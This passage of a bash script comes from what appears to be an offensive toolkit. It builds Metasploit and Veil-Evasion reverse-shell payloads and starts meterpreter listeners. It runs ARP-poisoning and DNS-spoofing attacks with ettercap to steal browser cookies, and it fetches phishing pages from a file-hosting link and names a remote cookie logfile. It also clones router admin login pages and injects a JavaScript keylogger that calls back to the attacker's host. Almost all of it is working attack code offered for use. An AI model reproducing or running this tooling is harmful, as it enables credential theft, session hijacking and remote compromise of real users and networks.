   echo ${BlueF}[*]${RedF}:${BlueF}[shellcode.txt]${RedF}:${GreenF}[ FILE FOUND ]${Reset};
   sleep 2
 
else

    echo ${RedF}[x]:[SHELLCODE.TXT]:[ NOT FOUND ]${Reset};
    zenity --error --text "Make sure you have build the shellcode befor (shellcode.txt)...\n\nshellcode.txt as to be stored under\n'/opensource/priv8' folder Befor it\ncan be Injected into a 'C' funtion." --width 350 > /dev/null 2>&1
    echo ${BlueF}[*]${RedF}:${BlueF}[PRESS ENTER TO EXIT MODULE]${Reset};     
    read op
    zenity --title="SHELLCODE OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.txt" --info > /dev/null 2>&1
    exit

fi

   #check if injector exists
   if [ -e $InJEc ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[exec.c]${RedF}:${GreenF}[ FILE FOUND ]${Reset};
   sleep 2
 
else

    echo ${RedF}[x]:[exec.c]:[ NOT FOUND ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[HELP URL]${RedF}:${GreenF}[ http://pastebin.com/WkBEWM8x ]${Reset};
    zenity --error --text "Download the C-INJECTOR from\nMy PasteBin account and place it\nOn '/opensource/modules' folder" --width 330 > /dev/null 2>&1
    echo ${BlueF}[*]${RedF}:${BlueF}[PRESS ENTER TO EXIT MODULE]${Reset};     
    read op
    zenity --title="SHELLCODE OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.txt" --info > /dev/null 2>&1
    exit

fi

   #check if gcc exists
   c0m=`which gcc`> /dev/null 2>&1
   if [ -e $c0m ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[GCC]${RedF}:${GreenF}[ FOUND ]${Reset};
   sleep 2
 
else

    echo ${RedF}[x]:[GCC]:[ NOT FOUND ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[HELP URL]${RedF}:${GreenF}[ http://goo.gl/hMuCor ]${Reset};
    zenity --error --text "Install GCC Package Befor Using\nThis 'C-INJECTOR' Module ...\n\nPlease visite my WKI for\nFurther info about gcc." --width 350 > /dev/null 2>&1
    echo ${BlueF}[*]${RedF}:${BlueF}[PRESS ENTER TO EXIT MODULE]${Reset};     
    read op
    zenity --title="SHELLCODE OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.txt" --info > /dev/null 2>&1
    exit

fi



# -----------------------------------
# BANNER DISPLAY AND MAIN FUNTION
# -----------------------------------
cat << !

     _______     _____ __   _ _____ _______ _______ _______  _____   ______
     |       ___   |   | \  |   |   |______ |          |    |     | |_____/
     |_____      __|__ |  \_| __|   |______ |_____     |    |_____| |    \_
                                                                       
           Build shellcode in C format using metasploit framework
           "or use shellcode in C output" and execute it on UNIX/BSD
           based distros using this injector, this module allows
           you to run your shellcode outputed in 'C' format.

!
    # EDITING/BACKUP FILES NEEDED
    N4m=$(zenity --entry --title "C-INJECTOR MODULE" --text "Input shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
    echo ${BlueF}[*]${RedF}:${BlueF}[C-INJECTOR MODULE]${RedF}:${GreenF}[ EDITING-BACKUP FILES ]${Reset};
    cp $InJEc $H0m3/opensource/modules/exec[bak].c
    zenity --title="EDIT 'exec.c' INJECTOR?" --text "Past the generated shellcode into exec.c\nReplacing the existing shellcode by our own.\n\nReplace just bellow 'unsigned char buf [] ='\nThe existing shellcode by your own." --info --width 430 > /dev/null 2>&1
    leafpad $InJEc > /dev/null 2>&1
    chown $user $InJEc > /dev/null 2>&1

        # COMPILING SHELLCODE USING GCC
        cd $H0m3/opensource/modules
        echo ${BlueF}[*]${RedF}:${BlueF}[C-INJECTOR MODULE]${RedF}:${GreenF}[ COMPILING USING GCC ]${Reset};
        gcc -fno-stack-protector -z execstack exec.c -o $N4m
        mv $N4m $H0m3/opensource/priv8/$N4m
        chown $user $H0m3/opensource/priv8/$N4m > /dev/null 2>&1

     # CLEANING EVERYTHING UP
     mv $H0m3/opensource/modules/exec[bak].c $InJEc
     chown $user $InJEc > /dev/null 2>&1
     echo ${BlueF}[*]${RedF}:${BlueF}[C-INJECTOR MODULE]${RedF}:${GreenF}[ CLEANING EVERYTHING ]${Reset};
     rm $H0m3/opensource/priv8/shellcode.txt > /dev/null 2>&1
     zenity --title="C-INJECTOR OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/$N4m\n\nEXECUTE:\nsudo ./$N4m" --info > /dev/null 2>&1

    # chose what to do with generated shellcode
    cH0=$(zenity --list --title "SHELLCODE GENERATOR" --text "Chose what to do with generated: $N4m" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 160) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$N4m $H0m3/$N4m
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        xterm -T "r00tsect0r - Shellcode listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

          # shellcode.txt will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > $N4m-C-handler.rc
          echo "set PAYLOAD $paylo" >> $N4m-C-handler.rc
          echo "set LPORT $lport" >> $N4m-C-handler.rc
          echo "set LHOST $lhost" >> $N4m-C-handler.rc
          echo "set ExitOnSession false" >> $N4m-C-handler.rc
          echo "exploit -j -z" >> $N4m-C-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $N4m-C-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user $N4m-C-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
     cd $H0m3/opensource
     sleep 2
     clear

      else
      # error funtion (aborted by user)
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi


      elif [ "$ans" "=" "Start a Listenner" ]; then
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[*]${RedF}:${BlueF}[shellcode generator]${RedF}:${GreenF}[ START SHELLCODE LISTENNER ]${Reset};
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        xterm -T "r00tsect0r - Shellcode listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

          # shellcode.txt will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > shellcode-handler.rc
          echo "set PAYLOAD $paylo" >> shellcode-handler.rc
          echo "set LPORT $lport" >> shellcode-handler.rc
          echo "set LHOST $lhost" >> shellcode-handler.rc
          echo "set ExitOnSession false" >> shellcode-handler.rc
          echo "exploit -j -z" >> shellcode-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user shellcode-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
          chown $user $InJEc > /dev/null 2>&1
          cd $H0m3/opensource
        sleep 2
        clear


      elif [ "$ans" "=" "C-TO-EXE (veil-evasion)" ]; then
      # local variables declaration
      LHOST=`ifconfig $inter | egrep -w "inet" | awk {'print $3'}`
      # GRAB VEIL-EVASION INSTALL PATH
      V31L=`cat $V3iL | egrep -m 1 "VEIL_EVASION_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1
      # GRAB VEIL-EVASION COMPILED OUTPUT FOLDER
      VEC0F=`cat $V3iL | egrep -m 1 "PAYLOAD_COMPILED_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1
      # GRAB VEIL-EVASION HANDLERS OUTPUT FOLDER
      VEH0F=`cat $V3iL | egrep -m 1 "HANDLER_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1
      # GRAB VEIL-EVASION HANDLERS OUTPUT FOLDER
      VEC=`cat $V3il | egrep -m 1 "PAYLOAD_SOURCE_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1



   if [ -e $V3iL ]; then
     # input payoad settings
     cd $V31L
     echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ BUILDING PAYLOAD C-TO-EXE ] ${Reset};
     # build payload using Veil-Evasion
     xterm -T "C-TO-EXE (veil-evasion)" -geometry 110x23 -e "./Veil-Evasion.py -p c/meterpreter/rev_tcp -c LHOST=$lhost LPORT=$lport -o net+veil"

    # copy files to toolkit
    echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ MOVING GENERATED FILES TO TOOKIT ] ${Reset};
    cd $VEC0F > /dev/null 2>&1
    mv net+veil.exe $H0m3/opensource/priv8/net+veil.exe
    chown $user $H0m3/opensource/priv8/net+veil.exe
    rm $VEC/net+veil.c > /dev/null 2>&1
    sleep 1




    #----->
    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "SHELLCODE GENERATOR" --text "Chose what to do with generated: net+veil.exe" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 160) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/net+veil.exe $H0m3/net+veil.exe
      cd $VEH0F && rm *.rc > /dev/null 2>&1
cat << !

     Shellcode Final Config:
     =======================
     Output Format : .exe
     LPORT         : $lport
     LHOST         : $lhost
     Filename      : net+veil.exe
     PAYLOAD       : windows/meterpreter/reverse_tcp

!
sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        cd $VEH0F > /dev/null 2>&1
        mv *.rc $H0m3/opensource/priv8/handler > /dev/null 2>&1
        cd $H0m3/opensource/priv8/handler
        chown $user *.rc
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ START SHELLCODE LISTENNER ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        xterm -T "r00tsect0r - Shellcode listenner" -geometry 110x23 -e "msfconsole -r net+veil_handler.rc"
        zenity --info --title="FILES STORED UNDER" --text "$H0m3/opensource/priv8/net+veil.exe\n$H0m3/opensource/priv8/handler/net+veil_handler.rc" --width 500 > /dev/null 2>&1
        # clean veil-evasion files
        cd $VEC && rm *.c > /dev/null 2>&1
        cd $H0m3/opensource

      else
      # error funtion (aborted by user)
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi
      #----->


   else
   # error funtion (veil not found)
   echo ${RedF}[x]:[ERROR]:[${YellowF} VEIL-EVASION NOT FOUND ${RedF}] ${Reset};
   zenity --info --title="C-TO-EXE (veil-evasion)" --text "ERROR: VEIL-FRAMEWORK NOT FOUND..." --width 400 > /dev/null 2>&1
   fi


  else

    # IN 'PRIV8.SH' WE CHOSE NOT TO RUN ANY OPTION PRESENTED (cancel button)
    echo ${RedF}[x]:[CANCEL OPTION ]:[ QUITTING MODULE ]${Reset};

      # shellcode.txt will be stored under '/opensource/priv8/' and 
      # 'shell_listenner.rc' file with msf settings will be stored under
      # '/opensource/priv8/' if we wish to start a listenner later...
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
      sleep 1
      cd $H0m3/opensource/priv8
      mkdir handler > /dev/null 2>&1
      cd handler > /dev/null 2>&1
      echo "use exploit/multi/handler" > shellcode-handler.rc
      echo "set PAYLOAD $paylo" >> shellcode-handler.rc
      echo "set LPORT $lport" >> shellcode-handler.rc
      echo "set LHOST $lhost" >> shellcode-handler.rc
      echo "set ExitOnSession false" >> shellcode-handler.rc
      echo "exploit -j -z" >> shellcode-handler.rc
      zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
    chown $user shellcode-handler.rc > /dev/null 2>&1
    chown -R $user $H0m3/opensource/priv8/handler
    chown $user $InJEc > /dev/null 2>&1
    sleep 2
  clear
fi
}






# DLL-INJECTOR FUNTION
sh_ffH () {
Colors;

   # START LISTENNER (and build shell_listenner.rc)
   QuE=$(zenity --question --title "SHELLCODE GENERATOR" --text "-:[ START SHELLCODE LISTENNER ? ]:-" --width 340) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[*]${RedF}:${BlueF}[shellcode generator]${RedF}:${GreenF}[ START SHELLCODE LISTENNER ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        xterm -T "r00tsect0r - Shellcode listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

          # shellcode.dll will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > shellcode-DLL-handler.rc
          echo "set PAYLOAD $paylo" >> shellcode-DLL-handler.rc
          echo "set LPORT $lport" >> shellcode-DLL-handler.rc
          echo "set LHOST $lhost" >> shellcode-DLL-handler.rc
          echo "set ExitOnSession false" >> shellcode-DLL-handler.rc
          echo "exploit -j -z" >> shellcode-DLL-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-DLL-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user shellcode-DLL-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
          cd $H0m3/opensource
        sleep 2
        clear

else


   echo ${RedF}[x]:[ QUITTING ]${Reset};
          # shellcode.txt will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > shellcode-DLL-handler.rc
          echo "set PAYLOAD $paylo" >> shellcode-DLL-handler.rc
          echo "set LPORT $lport" >> shellcode-DLL-handler.rc
          echo "set LHOST $lhost" >> shellcode-DLL-handler.rc
          echo "set ExitOnSession false" >> shellcode-DLL-handler.rc
          echo "exploit -j -z" >> shellcode-DLL-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-DLL-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user shellcode-DLL-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
   cd $H0m3/opensource
fi
}












# -------------------------------
# session hijacking cookies
# -------------------------------
sh_hijack () {
Colors;

cat << !

     ┌─┐┌─┐┌─┐┌─┐┬┌─┐┌┐┌  ┬ ┬┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌─┐
     └─┐├┤ └─┐└─┐││ ││││  ├─┤│ │├─┤│  ├┴┐│││││ ┬
     └─┘└─┘└─┘└─┘┴└─┘┘└┘  ┴ ┴┴└┘┴ ┴└─┘┴ ┴┴┘└┘└─┘

     Session Hijacking Menu:       Attack method:
     =======================       ==============
     1 - Steal cookies             under [MITM] networking
     2 - Steal cookies             Under [WAN] networking 
     3 - Steal cookies             Use our own webhosting
     4 - Open cookie Logfile       access the logfile

     Gathering info:               Attack method:
     ===============               ==============
     5 - IP tracer                 ip add whois,geo-location
     6 - Nmap scanner              scan for open ports

     m - Return to [r00tsect0r] main menu

!
      read -p "[+]:(chose option):" pass
      if [ "$pass" = "1" ]; then
      sh_mitmhijacking

      elif [ "$pass" = "2" ]; then
      sh_wan

      elif [ "$pass" = "3" ]; then
      sh_hosting

      elif [ "$pass" = "4" ]; then
      sh_log

      elif [ "$pass" = "5" ]; then
      sh_trackwhois

      elif [ "$pass" = "6" ]; then
      sh_nmapsca

      elif [ "$pass" = "m" ]; then
clear
fi
}


sh_mitmhijacking () {
Colors;

   #check if the payload exists
   if [ -e $H0m3/opensource/priv8/index.html ]; then
   rm $H0m3/opensource/priv8/index.html
   echo ${RedF}[x]:[please wait]:[ Deleting old payload from cache! ]${Reset};
   sleep 3
   sh_mitmhijacking

else

      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target

         #download index.html
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ Downloading files! ]${Reset};
         cd $H0m3/opensource/priv8
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/index-hijacking.html | zenity --progress --pulsate --title "DONWLOADING" --text="FILE: index-hijacking.html" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         mv index-hijacking.html index.html


         # copy files to apache2 webserver
         cp index.html $apache/index.html

         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 1

         # redirect webdomains
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start ARP poison ] ${Reset};
        echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
        # start ARP poison
        ettercap -T -Q -i $inter -P dns_spoof -M arp /$target// /$router//
        cd $H0m3/opensource/

      # stop apache2 webserver if is running
      /etc/init.d/apache2 stop

clear
sh_hijack
fi
}





sh_wan () {
Colors;
cat << !
      
     Post the provided Link on a social website [facebook]
     +----------------------------------------------------------+
     | http://nasa-develop.web44.net/news.php                   |
     +----------------------------------------------------------+

     +----------------------------------------------------------+
     | Or Shorten your URL using bit.do website | http://bit.do |
     +----------------------------------------------------------+      

!
cd $H0m3/opensource
   echo ${BlueF}[*]${RedF}:${blueF}press ${YellowF}[Enter]${BlueF} to 'return' to Session Hijacking Menu ${Reset};
   read op
   clear
   sh_hijack
}


sh_hosting () {
Colors;

   #check if the payload exists
   if [ -e $H0m3/opensource/priv8/news.php ]; then
   cd $H0m3/opensource/priv8
   rm news.php && rm cookies.html
   echo ${RedF}[x]:[please wait]:${white} Deleting old payload from cache! ${Reset};
   sleep 3
   sh_hosting

else

         #download news.php index.html and cookies.html
         cd $H0m3/opensource/priv8
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${white} Downloading files! ${Reset};
         touch cookies.html
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/news.php
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/index-hijacking.html | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: index-hijacking.html" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         mv index-hijacking.html index.html

            # set privs on files
            chmod 755 news.php

cat << !

     +---------------------------------------------------------------+
     |                 [ CONFIG NEWS.PHP PAYLOAD ]                   |
     +---------------------------------------------------------------+
     |   1º edit 'news.php' [ /opensource/priv8/news.php ]           |
     |   2º replace header("Location:") to redirect the target       |
     |      to another webdomain after the logfile is writen         |                        |
     |   3º upload 'news.php' 'cookies.html' to your webhosting      |
     |   4º edit 'index.html' and replace the location to your       |
     |      news.php in the javascript tag upload it to your webhost |  
     |   5º post the link were 'news.php' its stored                 |
     |   6º open <http://hosted//cookies.html> to see the logfile    |
     +---------------------------------------------------------------+

!
cd $H0m3/opensource
echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to Session Hijacking Menu ${Reset};
read op
clear
sh_hijack
fi
}



sh_log () {
cat << !
      
     Access the cookie logfile here:
     +----------------------------------------------------------+
     | http://nasa-develop.web44.net//cookies.html              |
     +----------------------------------------------------------+

!
sleep 2
su $user xdg-open "http://nasa-develop.web44.net//cookies.html" > /dev/null 2>&1
cd $H0m3/opensource
echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to Session Hijacking Menu ${Reset};
   read op
clear
sh_hijack
}



sh_trackwhois () {
cat << !
      
     Access the website here:
     +----------------------------------------------------------+
     | http://www.ip-adress.com/ip_tracer/                      |
     +----------------------------------------------------------+

!
cd $H0m3/opensource
echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to Session Hijacking Menu ${Reset};
   read op
clear
sh_hijack
}



sh_nmapsca () {
Colors;

   echo ${BlueF}[*]${RedF}:${YellowF}we can scan ports with this module 'in' 2 ways${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}[example]:${GreenF}[enter port to scan]:${BlueF}80,135,445${GreenF}[or]${BlueF}1-1000${Reset};


   ipscan=$(zenity --title="Scan IP addr" --text "example: 30.103.2.101" --entry) > /dev/null 2>&1
   PORT=$(zenity --title="Input Ports to scan" --text "example: 80,21,8080 OR 1-1000" --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}SMOKE TESTES {Nmap intense scans}${Reset};
   echo ""
   echo ""
   echo report > $H0m3/opensource/logs/nmaplog.txt
      nmap -T4 -PN -A -O -v $ipscan -p $PORT --reason -oN $H0m3/opensource/logs/nmaplog.txt
      echo ""
      Colors;
      echo ""
      echo ${BlueF}[*] --------------------------------------${Reset};
      echo ${BlueF}[*] {wait} LAUCHING VULNERABILITY SCAN${Reset};
      echo ${BlueF}[*] --------------------------------------${Reset}
      echo ""
      echo ""
      nmap -v --script vuln $ipscan -oN $H0m3/opensource/logs/nmapvulns.txt
   echo ""
   echo ""
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to Session Hijacking Menu ${Reset};
   read op
clear
sh_hijack
}









# -------------------------------------------
# D-LINK phishing module
# Routers admin login webpage phishing module
# -------------------------------------------
sh_DLINK () {
Colors;



# ----------------------------------
# VARIABLE DECLARATIONS
# ----------------------------------
####################################################################################################
v3r="1.3"                                                  # module version develop                #
w3re=`pwd`                                                 # grab script current directory         #
####################################################################################################
# ------------------
# BANNER DISPLAY
# ------------------
cat << !


               +------------------------------------+
   (=('~')=)   |    ROUTERS ADMIN LOGIN PHISHING    |
  ,))|o o|((,  |       Author: r00t-3xp10it         |
     ((_))     +------------------------------------+
      '-'      |_VERSION:$v3r


!
echo ${YellowF} Capture router webpage admin credentials over [${GreenF} LAN ${YellowF}]${Reset};
echo ${YellowF} this module will allow you to redirect all target traffic${Reset};
echo ${YellowF} to our apache2 that contains a phishing 'login' webpage${Reset};
echo ${YellowF} with a java keylooger embbebed to capture browser keystrokes${Reset};
echo ""
echo ""
echo ${YellowF}Press [${GreenF} ENTER ${YellowF}] to continue...${Reset};
read op





# ---------------------------------------------------------------
# clone a website and inject a metasploit iframe (java_keylogger)
# ---------------------------------------------------------------
Colors;

      # input attackers variables
      echo ${BlueF}[+]${RedF}:${BlueF}[ INPUT ATTACK VECTOR SETTINGS ]${Reset};
      lhost=$(zenity --title="Input your LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
m0D=$(zenity --list --title "ROUTERS ADMIN LOGIN PHISHING" --text "chose the phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "D-LINK ROUTERS LOGIN" FALSE "THOMPSON ROUTERS LOGIN" FALSE "UNIVERSAL ROUTERS LOGIN" --width 340 --height 200) > /dev/null 2>&1

      if [ "$m0D" = "D-LINK ROUTERS LOGIN" ]; then
        uripath=$(zenity --title="Input random URIPATH" --text "example: keylogger" --entry --width 300) > /dev/null 2>&1
        echo -n "[>]:{leave blank to poison all local network}(enter router ip address):"
        read router
        echo -n "[>]:{leave blank to poison all local network}(enter target ip address):"
        read victim

cd $H0m3/opensource/files/DLINK
cp -r $H0m3/opensource/files/DLINK $apache/DLINK
sudo chown -R $user $apache/DLINK
# inject the javascript <TAG> into cloned index.html using SED command
# and inject router gateway ip into cloned website to make a proper display
sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$lhost:8080\/$uripath\/test.js'><\/script><\/body>/g" index.html > copy.html
# copy all files to apache2 webroot
mv copy.html $apache/index.html
cp login.html $apache/login.html
cp logo.gif $apache/logo.gif


# display current config settings to attacker
cat << !

 DLINK [keylogger] Final Config:
 ===============================
 LPORT       : 8080
 LHOST       : $lhost
 GATEWAY     : $GATE
 PAYLOAD     : auxiliary/server/capture/http_javascript_keylogger
 INJECTION   : <script type="text/javascript" src="http://$lhost:8080/$uripath/test.js"></script>
 STORAGE IN  : $apache/index.html

!
         sleep 2
         # start apache2 webserver
         xterm -T "MITM DLINK PHISHING[$v3r] - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${GreenF}[ OK ]${Reset};
         sleep 2

      # setting ARP poison attack
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "MITM DLINK PHISHING[$v3r] - DNS_SPOOFING - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
      echo ${BlueF}[*]${RedF}:${BlueF}[keylooger]${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM + DNS_SPOOF attack ${Reset};
      sleep 3
      # start a listenner + ettercap mitm + dns_spoof
      xterm -T "MITM DLINK PHISHING[$v3r] - keylooger" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set LHOST $lhost; set URIPATH $uripath; set DEMO 0; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//


    # clean up script
    # stop apache2 webserver if is running
    /etc/init.d/apache2 stop
    rm -r $apache/DLINK
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/login.html > /dev/null 2>&1
    rm $apache/logo.gif > /dev/null 2>&1
    cd $H0m3/.msf4/loot
    mv *.txt $H0m3/opensource/logs > /dev/null 2>&1
    zenity --info --title="MITM DLINK PHISHING[$ver]" --text "Author: r00t-3xp10it\nRemmenber to check logfiles" --width 350 > /dev/null 2>&1
    cd $H0m3/opensource
      


      elif [ "$m0D" = "UNIVERSAL ROUTERS LOGIN" ]; then
        uripath=$(zenity --title="Input random URIPATH" --text "example: keylogger" --entry --width 300) > /dev/null 2>&1
        echo -n "[>]:{leave blank to poison all local network}(enter router ip address):"
        read router
        echo -n "[>]:{leave blank to poison all local network}(enter target ip address):"
        read victim

cd $H0m3/opensource/files/ROUTERS_DEFAULT
# inject the javascript <TAG> into cloned index.html using SED command
# and inject router gateway ip into cloned website to make a proper display
sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$lhost:8080\/$uripath\/test.js'><\/script><\/body>/g" index.html > copy.html
sed "s|G4tW41|$GATE|g" copy.html > copy2.html
# copy all files to apache2 webroot
mv copy2.html $apache/index.html
cp login.html $apache/login.html


# display current config settings to attacker
cat << !

 ROUTER [keylogger] Final Config:
 ================================
 LPORT       : 8080
 LHOST       : $lhost
 GATEWAY     : $GATE
 PAYLOAD     : auxiliary/server/capture/http_javascript_keylogger
 INJECTION   : <script type="text/javascript" src="http://$lhost:8080/$uripath/test.js"></script>
 STORAGE IN  : $apache/index.html

!
         sleep 2
         # start apache2 webserver
         xterm -T "UNIVERSAL ROUTER PHISHING[$v3r] - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
